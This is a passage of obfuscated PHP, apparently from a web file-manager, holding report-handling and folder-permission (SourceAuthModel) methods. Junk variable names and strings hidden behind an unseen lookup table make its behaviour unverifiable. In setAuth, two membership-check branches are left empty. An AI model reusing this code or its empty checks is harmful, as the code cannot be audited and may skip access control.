$£ÈöîÅÏ = $ˆŒ²ªÃò[$£ÈöîÅÏ]; $âÄ–Â½ = $âÄ–Â½ . "{$Üœì£­}\x20{$£ÈöîÅÏ}"; return $this->order($âÄ–Â½); } public function reportAdd($ÌˆºÎÏ­) { $Î¨Û®šõ =& $_SERVER[´‹ô¯Œ]; $¥É£Ë‚Ú = array($Î¨Û®šõ[682] => $ÌˆºÎÏ­[$Î¨Û®šõ[682]], $Î¨Û®šõ[1796] => USER_ID); if (Model($Î¨Û®šõ[2173])->where($¥É£Ë‚Ú)->find()) { return !1; } $Ä‡”Ù°¸ = array($Î¨Û®šõ[682] => $ÌˆºÎÏ­[$Î¨Û®šõ[682]], $Î¨Û®šõ[1684] => $ÌˆºÎÏ­[$Î¨Û®šõ[1684]], $Î¨Û®šõ[194] => $ÌˆºÎÏ­[$Î¨Û®šõ[194]], $Î¨Û®šõ[555] => $ÌˆºÎÏ­[$Î¨Û®šõ[555]], $Î¨Û®šõ[1796] => USER_ID, $Î¨Û®šõ[33] => $ÌˆºÎÏ­[$Î¨Û®šõ[33]], $Î¨Û®šõ[538] => $ÌˆºÎÏ­[$Î¨Û®šõ[538]]); return Model($Î¨Û®šõ[2173])->add($Ä‡”Ù°¸); } public function reportList($Š‘¯«ƒ«) { $÷çìßúÇ =& $_SERVER[´‹ô¯Œ]; $¦ËûÍ™ = array(); if ($Š‘¯«ƒ«[$÷çìßúÇ[846]]) { $¾Õ´ÅÇâ = $Š‘¯«ƒ«[$÷çìßúÇ[847]] ? $Š‘¯«ƒ«[$÷çìßúÇ[847]] : strtotime(date($÷çìßúÇ[2175])); $¦ËûÍ™[$÷çìßúÇ[234]] = array($÷çìßúÇ[411], array($Š‘¯«ƒ«[$÷çìßúÇ[846]], $¾Õ´ÅÇâ)); } if (isset($Š‘¯«ƒ«[$÷çìßúÇ[33]]) && in_array($Š‘¯«ƒ«[$÷çìßúÇ[33]], array($÷çìßúÇ[91], $÷çìßúÇ[522], $÷çìßúÇ[2178], $÷çìßúÇ[2179], $÷çìßúÇ[2180]))) { $¦ËûÍ™[$÷çìßúÇ[33]] = $Š‘¯«ƒ«[$÷çìßúÇ[33]]; } if (isset($Š‘¯«ƒ«[$÷çìßúÇ[836]]) && in_array($Š‘¯«ƒ«[$÷çìßúÇ[836]], array($÷çìßúÇ[231], $÷çìßúÇ[91], $÷çìßúÇ[522], $÷çìßúÇ[2178]))) { $¦ËûÍ™[$÷çìßúÇ[836]] = $Š‘¯«ƒ«[$÷çìßúÇ[836]]; } $·Ò“¬¦ = Input::get($÷çìßúÇ[543], $÷çìßúÇ[7], $÷çìßúÇ[2177], array($÷çìßúÇ[2092], $÷çìßúÇ[537])); $ìÔ©éÅ = array($÷çìßúÇ[535] => $÷çìßúÇ[536], $÷çìßúÇ[537] => $÷çìßúÇ[538]); $ˆî¨Ãæ = $÷çìßúÇ[2181] . $ìÔ©éÅ[$·Ò“¬¦]; $•şÙÖ³å = Model($÷çìßúÇ[2173])->where($¦ËûÍ™)->order($ˆî¨Ãæ)->selectPage(20); if (empty($•şÙÖ³å[$÷çìßúÇ[448]])) { return array(); } $óŠÃé = array_to_keyvalue_group($•şÙÖ³å[$÷çìßúÇ[448]], $÷çìßúÇ[836], $÷çìßúÇ[682]); if (!empty($óŠÃé[0])) { $Š‘¯«ƒ« = $óŠÃé[0]; $¦ËûÍ™ = array($÷çìßúÇ[682] => array($÷çìßúÇ[7], $Š‘¯«ƒ«)); $ª¯×¬ó = $this->where($¦ËûÍ™)->field($÷çìßúÇ[682])->select(); $ª¯×¬ó = array_to_keyvalue($ª¯×¬ó, $÷çìßúÇ[12], $÷çìßúÇ[682]); $ğÛÑÖÖ¬ = array_diff($Š‘¯«ƒ«, $ª¯×¬ó); if (!empty($ğÛÑÖÖ¬)) { foreach ($•şÙÖ³å[$÷çìßúÇ[448]] as $ô„æÁ¾Ğ => $÷’Ğ•üã) { if (in_array($÷’Ğ•üã[$÷çìßúÇ[682]], $ğÛÑÖÖ¬)) { unset($•şÙÖ³å[$÷çìßúÇ[448]][$ô„æÁ¾Ğ]); } } } } $this->_listDataApply($•şÙÖ³å[$÷çìßúÇ[448]]); return $•şÙÖ³å; } public function reportStatus($İ‰ÇÃ–) { $ïÁšÆîı =& $_SERVER[´‹ô¯Œ]; $‰îšè´µ = array($ïÁšÆîı[487] => $İ‰ÇÃ–[$ïÁšÆîı[487]]); $Ãá€Â¶© = Model($ïÁšÆîı[2173])->where($‰îšè´µ)->field($ïÁšÆîı[2182])->find(); if (!$Ãá€Â¶©) { return !1; } $÷¤µà¹ = array($ïÁšÆîı[836] => $İ‰ÇÃ–[$ïÁšÆîı[836]]); if ($İ‰ÇÃ–[$ïÁšÆîı[836]] == $ïÁšÆîı[2178] && $Ãá€Â¶©[$ïÁšÆîı[836]] == $ïÁšÆîı[2178]) { $÷¤µà¹[$ïÁšÆîı[836]] = 0; } $ŠÉöŒÏú = Model($ïÁšÆîı[2173])->where($‰îšè´µ)->save($÷¤µà¹); if ($İ‰ÇÃ–[$ïÁšÆîı[836]] == $ïÁšÆîı[522]) { if ($Ãá€Â¶©[$ïÁšÆîı[555]] != $ïÁšÆîı[231] && $this->shareFileMeta($Ãá€Â¶©[$ïÁšÆîı[555]])) { $this->shareFileMeta($Ãá€Â¶©[$ïÁšÆîı[555]], 0); } $this->remove($Ãá€Â¶©[$ïÁšÆîı[682]]); return !0; } if ($ŠÉöŒÏú && $İ‰ÇÃ–[$ïÁšÆîı[836]] == $ïÁšÆîı[2178]) { $·ï…º¤ó = $÷¤µà¹[$ïÁšÆîı[836]] == $ïÁšÆîı[2178] ? 1 : 0; $this->shareFileMeta($Ãá€Â¶©[$ïÁšÆîı[555]], $·ï…º¤ó); $this->removeByFile($Ãá€Â¶©[$ïÁšÆîı[555]]); } return $ŠÉöŒÏú; } private function removeByFile($¿’ô›Ÿ) { $¦¾ÁüÜ± =& $_SERVER[´‹ô¯Œ]; $æÙ‚¿®‹ = Model($¦¾ÁüÜ±[916])->where(array($¦¾ÁüÜ±[555] => $¿’ô›Ÿ))->field($¦¾ÁüÜ±[194])->select(); $×©¨” = array_to_keyvalue($æÙ‚¿®‹, $¦¾ÁüÜ±[12], $¦¾ÁüÜ±[194]); $®¸’Ì¢“ = array($¦¾ÁüÜ±[194] => array($¦¾ÁüÜ±[7], $×©¨”), $¦¾ÁüÜ±[576] => 1); $æÙ‚¿®‹ = $this->where($®¸’Ì¢“)->field($¦¾ÁüÜ±[682])->select(); if (empty($æÙ‚¿®‹)) { return; } $å¡Ÿô¾ğ = array_to_keyvalue($æÙ‚¿®‹, $¦¾ÁüÜ±[12], $¦¾ÁüÜ±[682]); $this->remove($å¡Ÿô¾ğ); } private function shareFileMeta($òÕ–²¯ì, $Âááåà = null) { $¨ôÀ¤«˜ =& $_SERVER[´‹ô¯Œ]; $¯÷Íô¨Ï = array($¨ôÀ¤«˜[555] => $òÕ–²¯ì, $¨ôÀ¤«˜[97] => $¨ôÀ¤«˜[2183]); if (is_null($Âááåà)) { return Model($¨ôÀ¤«˜[2184])->where($¯÷Íô¨Ï)->find(); } $¯÷Íô¨Ï[$¨ôÀ¤«˜[453]] = $Âááåà; Model($¨ôÀ¤«˜[2184])->add($¯÷Íô¨Ï, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\x63\x65\137\x61\x75\164\x68"; public function getAuth($§áöáéœ) { $„û…üŞŠ =& $_SERVER[´‹ô¯Œ]; $ı¯úÃ¶¤ = $this->sourceAuthSelect($§áöáéœ); $ª¥ÕçúÊ = array(); $ÕÃÀ©Œã = array(); $ŸëÇÓÕØ = 2 << 25; foreach ($ı¯úÃ¶¤ as $ÍÚë¤™ü) { $Š—í©­ô = Model($„û…üŞŠ[585])->listData($ÍÚë¤™ü[$„û…üŞŠ[2105]]); if (!$Š—í©­ô) { continue; } $ª¥ÕçúÊ[] = $ÍÚë¤™ü; $å›ºƒõ‚ = 0; if ($ÍÚë¤™ü[$„û…üŞŠ[191]] == SourceModel::TYPE_GROUP) { $å›ºƒõ‚ = $ŸëÇÓÕØ * 2; } if ($ÍÚë¤™ü[$„û…üŞŠ[191]] == SourceModel::TYPE_USER) { $å›ºƒõ‚ = $ŸëÇÓÕØ; } if ($ÍÚë¤™ü[$„û…üŞŠ[191]] == SourceModel::TYPE_USER && $ÍÚë¤™ü[$„û…üŞŠ[583]] == $„û…üŞŠ[231]) { $å›ºƒõ‚ = 0; } $ÕÃÀ©Œã[] = $Š—í©­ô[$„û…üŞŠ[499]] + $å›ºƒõ‚; } array_multisort($ÕÃÀ©Œã, SORT_DESC, $ª¥ÕçúÊ); return $ª¥ÕçúÊ; } public function sourceAuthSelect($×‰Ã¯«¨) { $Ÿ‹…Ïµâ =& $_SERVER[´‹ô¯Œ]; static $ü˜¢œóŞ = array(); $®ëÚ¦“ = is_array($×‰Ã¯«¨) ? !1 : !0; if ($®ëÚ¦“) { $×‰Ã¯«¨ = array($×‰Ã¯«¨); } $¤ßÆÉí = array(); foreach ($×‰Ã¯«¨ as $’÷ÜÕ²Ò) { if (isset($ü˜¢œóŞ[$’÷ÜÕ²Ò])) { $¤ßÆÉí[$’÷ÜÕ²Ò] = $ü˜¢œóŞ[$’÷ÜÕ²Ò]; } } if (count($¤ßÆÉí) == count($×‰Ã¯«¨)) { return $®ëÚ¦“ ? $¤ßÆÉí[$×‰Ã¯«¨[0]] : $¤ßÆÉí; } $ÇõíŒ¹„ = $Ÿ‹…Ïµâ[2185]; $‡ËÆ¾»è = array($Ÿ‹…Ïµâ[194] => array($Ÿ‹…Ïµâ[7], $×‰Ã¯«¨)); $Íı¹ÔÓ = $this->field($ÇõíŒ¹„)->order($Ÿ‹…Ïµâ[487])->where($‡ËÆ¾»è)->select(); $¥ùóé§ = array_to_keyvalue_group($Íı¹ÔÓ, $Ÿ‹…Ïµâ[194]); foreach ($×‰Ã¯«¨ as $’÷ÜÕ²Ò) { $ü˜¢œóŞ[$’÷ÜÕ²Ò] = $¥ùóé§[$’÷ÜÕ²Ò] ? $¥ùóé§[$’÷ÜÕ²Ò] : array(); } if ($®ëÚ¦“) { return $Íı¹ÔÓ; } return $¥ùóé§; } public function setAuth($¹íç¦Œ”, $‚’şöãš) { $Á¡ëÊ²• =& $_SERVER[´‹ô¯Œ]; $µÉ•†“š = Model($Á¡ëÊ²•[1445])->sourceInfo($¹íç¦Œ”); if (!$µÉ•†“š) { return !1; } if ($µÉ•†“š[$Á¡ëÊ²•[191]] != SourceModel::TYPE_GROUP) { return !1; } $ûÆŒ¢Ûº = 1; $ôÈÔ¨ = $µÉ•†“š[$Á¡ëÊ²•[583]]; if ($ôÈÔ¨ != $ûÆŒ¢Ûº) { $Ó²¦ÛÚ‹ = array($Á¡ëÊ²•[1407] => $ôÈÔ¨); $ç¾íÎ© = Model($Á¡ëÊ²•[2091])->field($Á¡ëÊ²•[1796])->where($Ó²¦ÛÚ‹)->select(); $ç¾íÎ© = array_to_keyvalue($ç¾íÎ©, $Á¡ëÊ²•[12], $Á¡ëÊ²•[1796]); } $‚éÄšüÚ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $š¨àúü¢ = array(); foreach ($‚’şöãš as $¬÷•â±Î) { if (!in_array($¬÷•â±Î[$Á¡ëÊ²•[191]], $‚éÄšüÚ)) { show_json(LNG($Á¡ëÊ²•[2186]), !1); } if ($ôÈÔ¨ != $ûÆŒ¢Ûº) { if ($¬÷•â±Î[$Á¡ëÊ²•[191]] == SourceModel::TYPE_GROUP) { } if ($¬÷•â±Î[$Á¡ëÊ²•[583]] != 0 && !in_array($¬÷•â±Î[$Á¡ëÊ²•[583]], $ç¾íÎ©)) { } } if ($¬÷•â±Î[$Á¡ëÊ²•[583]] == 0) { $¬÷•â±Î[$Á¡ëÊ²•[191]] = SourceModel::TYPE_USER; } $š¨àúü¢[] = array($Á¡ëÊ²•[194] => $¹íç¦Œ”, $Á¡ëÊ²•[191] => intval($¬÷•â±Î[$Á¡ëÊ²•[191]]), $Á¡ëÊ²•[583] => intval($¬÷•â±Î[$Á¡ëÊ²•[583]]), $Á¡ëÊ²•[2105] => intval($¬÷•â±Î[$Á¡ëÊ²•[2105]]) ? intval($¬÷•â±Î[$Á¡ëÊ²•[2105]]) : 0, $Á¡ëÊ²•[2168] => intval($¬÷•â±Î[$Á¡ëÊ²•[2168]]) ? intval($¬÷•â±Î[$Á¡ëÊ²•[2168]]) : -1); } $this->where(array($Á¡ëÊ²•[503] => $¹íç¦Œ”))->delete(); $this->addAll($š¨àúü¢); return !0; } public function authClear($ñÁ·ÄèĞ) { $˜éÄıŞü =& $_SERVER[´‹ô¯Œ]; $úö¿ƒ½– = Model($˜éÄıŞü[1445])->sourceInfo($ñÁ·ÄèĞ); $ô†•çš = array($ñÁ·ÄèĞ); if ($úö¿ƒ½–[$˜éÄıŞü[497]] == $˜éÄıŞü[91]) { $Îçãûšë = array($˜éÄıŞü[669] => array($˜éÄıŞü[629], $úö¿ƒ½–[$˜éÄıŞü[598]] . $ñÁ·ÄèĞ . $˜éÄıŞü[630])); $ô†•çš = Model($˜éÄıŞü[1445])->field($˜éÄıŞü[503])->where($Îçãûšë)->getField($˜éÄıŞü[194], !0); $ô†•çš[] = $ñÁ·ÄèĞ; } $this->where(array($˜éÄıŞü[503] => array($˜éÄıŞü[504], $ô†•çš)))->delete(); return !0; } public function getAllChildren($úöŒıÙÎ) { $ÑòÊşıÚ =& $_SERVER[´‹ô¯Œ]; $ñ‡¶¤µË = Model($ÑòÊşıÚ[1445])->sourceInfo($úöŒıÙÎ); if ($ñ‡¶¤µË[$ÑòÊşıÚ[497]] != $ÑòÊşıÚ[91]) { return $this->sourceListAuth(array($úöŒıÙÎ)); } if ($ñ‡¶¤µË[$ÑòÊşıÚ[191]] != SourceModel::TYPE_GROUP) { return array(); } $¼èÕª¶ç = 1; $Î©˜ğ´õ = array($úöŒıÙÎ); if ($ñ‡¶¤µË[$ÑòÊşıÚ[193]] == $ÑòÊşıÚ[231] && $ñ‡¶¤µË[$ÑòÊşıÚ[583]] != $¼èÕª¶ç) { $Î©˜ğ´õ = $this->groupChidldAllRootSource($ñ‡¶¤µË[$ÑòÊşıÚ[583]]); } $¥á…—§Ê = $this->field($ÑòÊşıÚ[194])->group($ÑòÊşıÚ[194])->select(); $¥á…—§Ê = array_to_keyvalue($¥á…—§Ê, $ÑòÊşıÚ[12], $ÑòÊşıÚ[194]); if (!$¥á…—§Ê) { return array(); } $‚ÊÁ  = $ÑòÊşıÚ[2187]; $ˆÈÔ‘®Ó = array($ÑòÊşıÚ[194] => array($ÑòÊşıÚ[7], $¥á…—§Ê), $ÑòÊşıÚ[517] => $ÑòÊşıÚ[231]); $·ÖÜÉ· = Model($ÑòÊşıÚ[916])->field($‚ÊÁ )->where($ˆÈÔ‘®Ó)->select(); $ŒÚúÓ¾Æ = array($úöŒıÙÎ); foreach ($·ÖÜÉ· as $Òú—›áÌ) { foreach ($Î©˜ğ´õ as $½“ Á™ä) { $šº§ß = $ÑòÊşıÚ[50] . $½“ Á™ä . $ÑòÊşıÚ[50]; $ôÀâ¹á£ = $Òú—›áÌ[$ÑòÊşıÚ[598]] . $Òú—›áÌ[$ÑòÊşıÚ[194]] . $ÑòÊşıÚ[50]; if (strstr($ôÀâ¹á£, $šº§ß)) { $ŒÚúÓ¾Æ[] = $Òú—›áÌ[$ÑòÊşıÚ[194]]; break; } } } return $this->sourceListAuth($ŒÚúÓ¾Æ); } private function sourceListAuth($Õæ©˜ˆÆ) { $™ı‘éû“ =& $_SERVER[´‹ô¯Œ]; $¥åşñ¿ˆ = Model($™ı‘éû“[1445])->sourceListInfo($Õæ©˜ˆÆ, !0); $ãÆõÈœ— = $this->sourceAuthSelect($Õæ©˜ˆÆ); $Óªêäùì = array(); $û³–ß® = array(); foreach ($¥åşñ¿ˆ as $»æş¤ôï) { unset($»æş¤ôï[$™ı‘éû“[541]]); unset($»æş¤ôï[$™ı‘éû“[539]]); unset($»æş¤ôï[$™ı‘éû“[499]]); unset($»æş¤ôï[$™ı‘éû“[90]]); $¯öÈÀ®Ë = $ãÆõÈœ—[$»æş¤ôï[$™ı‘éû“[194]]]; if (!$¯öÈÀ®Ë) { continue; } $»æş¤ôï[$™ı‘éû“[2188]] = $this->authTargetInfo($¯öÈÀ®Ë); $»æş¤ôï[$™ı‘éû“[596]] = rtrim($»æş¤ôï[$™ı‘éû“[602]], $™ı‘éû“[8]) . $™ı‘éû“[8] . ltrim($»æş¤ôï[$™ı‘éû“[596]], $™ı‘éû“[8]); $Óªêäùì[] = $»æş¤ôï; $õµö€¿à = count(explode($™ı‘éû“[8], trim($»æş¤ôï[$™ı‘éû“[596]], $™ı‘éû“[8]))); $û³–ß®[] = $õµö€¿à + ($»æş¤ôï[$™ı‘éû“[33]] == $™ı‘éû“[78] ? 0 : 1000); } array_multisort($û³–ß®, SORT_ASC, $Óªêäùì); return $Óªêäùì; } private function groupChidldAllRootSource($‘¼ìÛ‘œ) { $â–à¥´ =& $_SERVER[´‹ô¯Œ]; $¶ËÚÀ÷è = Model($â–à¥´[1405])->groupChildrenAll($‘¼ìÛ‘œ); $£ÉÑåŒ = array($â–à¥´[193] => 0, $â–à¥´[583] => array($â–à¥´[7], $¶ËÚÀ÷è), $â–à¥´[191] => SourceModel::TYPE_GROUP); $‘ç’”â = Model($â–à¥´[916])->field($â–à¥´[194])->where($£ÉÑåŒ)->select(); $‘ç’”â = array_to_keyvalue($‘ç’”â, $â–à¥´[12], $â–à¥´[194]); return $‘ç’”â; } private function authTargetInfo($¶‹Ãé¤Á) { $á¶†º±· =& $_SERVER[´‹ô¯Œ]; $Çş…¢¹ø = array(); $¿ˆšõ‹× = array(); $òïóÒœÍ = 2 << 25; foreach ($¶‹Ãé¤Á as $åÜùı˜Í) { $Ô™—‡Ş = Model($á¶†º±·[585])->listData($åÜùı˜Í[$á¶†º±·[2105]]); if (!$Ô™—‡Ş) { continue; } if ($åÜùı˜Í[$á¶†º±·[191]] == SourceModel::TYPE_USER) { $ˆ×Šñ€ = Model($á¶†º±·[591])->getInfoSimpleOuter($åÜùı˜Í[$á¶†º±·[583]]); if ($ˆ×Šñ€[$á¶†º±·[1796]] == $á¶†º±·[1290]) { continue; } if ($ˆ×Šñ€[$á¶†º±·[1796]] == $á¶†º±·[231]) { $ˆ×Šñ€[$á¶†º±·[32]] = LNG($á¶†º±·[2189]); } } else { $ˆ×Šñ€ = Model($á¶†º±·[599])->getInfoSimple($åÜùı˜Í[$á¶†º±·[583]]); } if (!$ˆ×Šñ€) { continue; } $ˆ×Šñ€[$á¶†º±·[554]] = $Ô™—‡Ş; $Çş…¢¹ø[] = $ˆ×Šñ€; $ô”±´Ï½ = 0; if ($åÜùı˜Í[$á¶†º±·[191]] == SourceModel::TYPE_GROUP) { $ô”±´Ï½ = $òïóÒœÍ * 2; } if ($åÜùı˜Í[$á¶†º±·[191]] == SourceModel::TYPE_USER) { $ô”±´Ï½ = $òïóÒœÍ; } if ($åÜùı˜Í[$á¶†º±·[191]] == SourceModel::TYPE_USER && $åÜùı˜Í[$á¶†º±·[583]] == $á¶†º±·[231]) { $ô”±´Ï½ = 0; } $¿ˆšõ‹×[] = $Ô™—‡Ş[$á¶†º±·[499]] + $ô”±´Ï½; } array_multisort($¿ˆšõ‹×, SORT_DESC, $Çş…¢¹ø); return $Çş…¢¹ø; } public function getAllChildrenByUser($¡‡ê•å¨, $ñıÏéˆÓ) { $™˜°ò·‹ =& $_SERVER[´‹ô¯Œ]; $µ¤±Ûü¥ = Model($™˜°ò·‹[611])->getInfo($ñıÏéˆÓ); if (!$ñıÏéˆÓ || !$¡‡ê•å¨ || !$µ¤±Ûü¥) { return array(); } $È‡·¬² = Model($™˜°ò·‹[1445])->sourceInfo($¡‡ê•å¨); $ô¹ŞÍó = array(); $ìê´¿Û„ = 1; if ($È‡·¬²[$™˜°ò·‹[193]] == $™˜°ò·‹[231] && $È‡·¬²[$™˜°ò·‹[583]] != $ìê´¿Û„ && $this->groupContainUser($È‡·¬²[$™˜°ò·‹[583]], $ñıÏéˆÓ)) { foreach ($µ¤±Ûü¥[$™˜°ò·‹[1406]] as $‘úÆîÌ) { $Œ—†ò„£ = Model($™˜°ò·‹[599])->getInfo($‘úÆîÌ[$™˜°ò·‹[1407]]); $«ÃìÊôé = Model($™˜°ò·‹[611])->getInfoSimpleOuter($ñıÏéˆÓ); $«ÃìÊôé[$™˜°ò·‹[554]] = $‘úÆîÌ[$™˜°ò·‹[499]]; if (Model($™˜°ò·‹[585])->authCheckAction($‘úÆîÌ[$™˜°ò·‹[499]][$™˜°ò·‹[499]], $™˜°ò·‹[2017])) { continue; } $­Ï‹¿˜ = array($™˜°ò·‹[32] => $™˜°ò·‹[1310] . $Œ—†ò„£[$™˜°ò·‹[32]], $™˜°ò·‹[194] => $Œ—†ò„£[$™˜°ò·‹[90]][$™˜°ò·‹[194]], $™˜°ò·‹[87] => KodIO::make($Œ—†ò„£[$™˜°ò·‹[90]][$™˜°ò·‹[194]]), $™˜°ò·‹[193] => $™˜°ò·‹[231], $™˜°ò·‹[191] => $™˜°ò·‹[592], $™˜°ò·‹[33] => $™˜°ò·‹[633], $™˜°ò·‹[596] => $Œ—†ò„£[$™˜°ò·‹[603]], $™˜°ò·‹[1407] => $Œ—†ò„£[$™˜°ò·‹[1407]], $™˜°ò·‹[600] => $Œ—†ò„£[$™˜°ò·‹[193]], $™˜°ò·‹[2188] => array($«ÃìÊôé)); $ô¹ŞÍó[$­Ï‹¿˜[$™˜°ò·‹[194]]] = $­Ï‹¿˜; } } $À”ëËŸ… = array(); $”ãÎ¼×Ø = $this->getAllChildren($¡‡ê•å¨); foreach ($”ãÎ¼×Ø as $­É›ï¿) { $¼Ü„Ğ×Ú = !1; foreach ($­É›ï¿[$™˜°ò·‹[2188]] as $íæ½„Ü) { if ($íæ½„Ü[$™˜°ò·‹[1796]]) { if ($íæ½„Ü[$™˜°ò·‹[1796]] == $ñıÏéˆÓ) { $¼Ü„Ğ×Ú = !0; break; } } if ($íæ½„Ü[$™˜°ò·‹[1407]]) { if ($this->groupContainUser($íæ½„Ü[$™˜°ò·‹[1407]], $ñıÏéˆÓ)) { $¼Ü„Ğ×Ú = !0; break; } } } if ($¼Ü„Ğ×Ú) { $À”ëËŸ…[] = $­É›ï¿; } $Ùì½ğ­¹ = $­É›ï¿[$™˜°ò·‹[194]]; if (isset($ô¹ŞÍó[$Ùì½ğ­¹])) { $­É›ï¿[$™˜°ò·‹[2188]][] = $ô¹ŞÍó[$Ùì½ğ­¹][0]; $ô¹ŞÍó[$Ùì½ğ­¹] = !1; } } $ô¹ŞÍó = array_filter(array_values($ô¹ŞÍó)); $À”ëËŸ… = array_merge($ô¹ŞÍó, $À”ëËŸ…); return $À”ëËŸ…; } public function setAllChildrenByUser($ÏÅ”šµ, $‚¬Õ»†ı, $Ù×­‡Ø´) { $²»ÅÒÀ˜ =& $_SERVER[´‹ô¯Œ]; $îöíÎš = $this->getAllChildrenByUser($ÏÅ”šµ, $‚¬Õ»†ı); if (!$Ù×­‡Ø´ || !$îöíÎš) { return !1; } foreach ($îöíÎš as $««šÌË†) { $ËüúĞüë = array(); foreach ($««šÌË†[$²»ÅÒÀ˜[2188]] as $Õ±ìÒÙı) { $úïëòÖä = $Õ±ìÒÙı[$²»ÅÒÀ˜[554]]; $ó¥óà•¿ = $Õ±ìÒÙı[$²»ÅÒÀ˜[1796]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Â€…¤ÈË = $Õ±ìÒÙı[$²»ÅÒÀ˜[1796]] ? $Õ±ìÒÙı[$²»ÅÒÀ˜[1796]] : $Õ±ìÒÙı[$²»ÅÒÀ˜[1407]]; if ($Õ±ìÒÙı[$²»ÅÒÀ˜[1796]] && $Õ±ìÒÙı[$²»ÅÒÀ˜[1796]] == $‚¬Õ»†ı) { continue; } $ËüúĞüë[] = array($²»ÅÒÀ˜[194] => $««šÌË†[$²»ÅÒÀ˜[194]], $²»ÅÒÀ˜[191] => $ó¥óà•¿, $²»ÅÒÀ˜[583] => intval($Â€…¤ÈË), $²»ÅÒÀ˜[2105] => isset($úïëòÖä[$²»ÅÒÀ˜[487]]) ? intval($úïëòÖä[$²»ÅÒÀ˜[487]]) : 0, $²»ÅÒÀ˜[2168] => isset($úïëòÖä[$²»ÅÒÀ˜[2168]]) ? intval($úïëòÖä[$²»ÅÒÀ˜[2168]]) : -1); } $ËüúĞüë[] = array($²»ÅÒÀ˜[194] => $««šÌË†[$²»ÅÒÀ˜[194]], $²»ÅÒÀ˜[191] => SourceModel::TYPE_USER, $²»ÅÒÀ˜[583] => intval($‚¬Õ»†ı), $²»ÅÒÀ˜[2105] => intval($Ù×­‡Ø´), $²»ÅÒÀ˜[2168] => -1); $this->where(array($²»ÅÒÀ˜[503] => $««šÌË†[$²»ÅÒÀ˜[194]]))->delete(); $this->addAll($ËüúĞüë); } return !0; } public function get($á•âÇ) { $ÍŒ»±½À = $this->getSourceList(array($á•âÇ), !0); return $ÍŒ»±½À[0]; } public function getSourceList($§¢—ı¼¨, $Œüéàœ = false, $¦òâà¡ = false) { $¥íÅĞÁ =& $_SERVER[´‹ô¯Œ]; if (!$§¢—ı¼¨) { return array(); } $¼‘¬äªø = Model($¥íÅĞÁ[1445]); if (!$Œüéàœ && count($§¢—ı¼¨) == 1) { $Œüéàœ = array(); $Œüéàœ[$§¢—ı¼¨[0]] = $¼‘¬äªø->sourceInfo($§¢—ı¼¨[0]); } if (!$Œüéàœ) { $å×¢¶õ« = array($¥íÅĞÁ[503] => array($¥íÅĞÁ[504], $§¢—ı¼¨)); $Œüéàœ = $¼‘¬äªø->field($¥íÅĞÁ[2190])->where($å×¢¶õ«)->select(); $Œüéàœ = array_to_keyvalue($Œüéàœ, $¥íÅĞÁ[194]); } $¹¦¶¡‡Æ = $§¢—ı¼¨; foreach ($Œüéàœ as $¹†À¼ûö => $áÇ³¸şü) { $Ô¶Ü¾ü = $¼‘¬äªø->parentLevelArray($áÇ³¸şü[$¥íÅĞÁ[598]]); $¹¦¶¡‡Æ = array_merge($¹¦¶¡‡Æ, array($¹†À¼ûö), array_reverse($Ô¶Ü¾ü)); } $¹¦¶¡‡Æ = array_values(array_unique($¹¦¶¡‡Æ)); if (!$¹¦¶¡‡Æ) { return array(); } $Æè•„Á‘ = $this->sourceAuthSelect($¹¦¶¡‡Æ); $¼è›š±ñ = array(); foreach ($¹¦¶¡‡Æ as $úÕË§¾) { if (isset($Æè•„Á‘[$úÕË§¾])) { $¼è›š±ñ[$úÕË§¾] = $Æè•„Á‘[$úÕË§¾]; } } $ãŸçÎŒ– = $this->userIsRoot($¦òâà¡); $™òñÑ‘Í = AuthModel::authAll(); $Ì™€“ºÒ = array($¥íÅĞÁ[500] => $™òñÑ‘Í, $¥íÅĞÁ[2191] => array($¥íÅĞÁ[505] => 0, $¥íÅĞÁ[2002] => $™òñÑ‘Í, $¥íÅĞÁ[506] => LNG($¥íÅĞÁ[2192]), $¥íÅĞÁ[2019] => $¥íÅĞÁ[2193])); $å‰±¿Êê = array(); foreach ($Œüéàœ as $úÕË§¾ => $ÅÕÜ²Ÿ) { if ($ãŸçÎŒ– && $GLOBALS[$¥íÅĞÁ[6]][$¥íÅĞÁ[2015]]) { $å‰±¿Êê[$úÕË§¾] = $Ì™€“ºÒ; continue; } $å‰±¿Êê[$úÕË§¾] = $this->makeSourceAuth($ÅÕÜ²Ÿ, $¼è›š±ñ, $¦òâà¡); } return $å‰±¿Êê; } public function authDeepCheck($†½´›úé, $ÛŠş’‚ë = false) { $¦í˜•† =& $_SERVER[´‹ô¯Œ]; $ÛŠş’‚ë = $ÛŠş’‚ë ? $ÛŠş’‚ë : USER_ID; $–Îéæ•Ô = $this->makeAuthDeep($ÛŠş’‚ë); if (!in_array($†½´›úé, $–Îéæ•Ô[$¦í˜•†[2194]])) { return !1; } $¼¤ŒÑƒä = array(); foreach ($–Îéæ•Ô[$¦í˜•†[2195]] as $½ğŸåõ” => $ÈÕß¦î–) { if (!in_array($†½´›úé, $ÈÕß¦î–)) { continue; } $¼¤ŒÑƒä[] = $½ğŸåõ”; } if (!$¼¤ŒÑƒä) { return !1; } $¦ÍıÅ¸Ì = $¼¤ŒÑƒä ? $¼¤ŒÑƒä[0] : $†½´›úé; return array($¦í˜•†[500] => -1, $¦í˜•†[554] => array($¦í˜•†[505] => $¦í˜•†[1290], $¦í˜•†[2002] => $¦í˜•†[231], $¦í˜•†[506] => LNG($¦í˜•†[2196]), $¦í˜•†[2019] => $¦í˜•†[2197]), $¦í˜•†[2198] => LNG($¦í˜•†[2199]), $¦í˜•†[2200] => $this->sourceAuthInfo($¦ÍıÅ¸Ì)); } protected function makeAuthDeep($Á¦ØŒ¼¢ = false) { $Üü€ş =& $_SERVER[´‹ô¯Œ]; static $çÊˆ—¹ = array(); $Á¦ØŒ¼¢ = $Á¦ØŒ¼¢ ? $Á¦ØŒ¼¢ : USER_ID; if (isset($çÊˆ—¹[$Á¦ØŒ¼¢])) { return $çÊˆ—¹[$Á¦ØŒ¼¢]; } $Ä»ØÒò‰ = Model($Üü€ş[2201])->listData(); $½Ö“İÑ = array(); foreach ($Ä»ØÒò‰ as $œ™¤úœ) { if ($œ™¤úœ[$Üü€ş[499]] == 0 && $œ™¤úœ[$Üü€ş[2018]] == $Üü€ş[91]) { $½Ö“İÑ[] = $œ™¤úœ[$Üü€ş[487]]; } } $ˆïÄ“õ– = $this->userGroupParents($Á¦ØŒ¼¢); $‡‚ãâŒ… = array($Üü€ş[191] => SourceModel::TYPE_USER, $Üü€ş[583] => 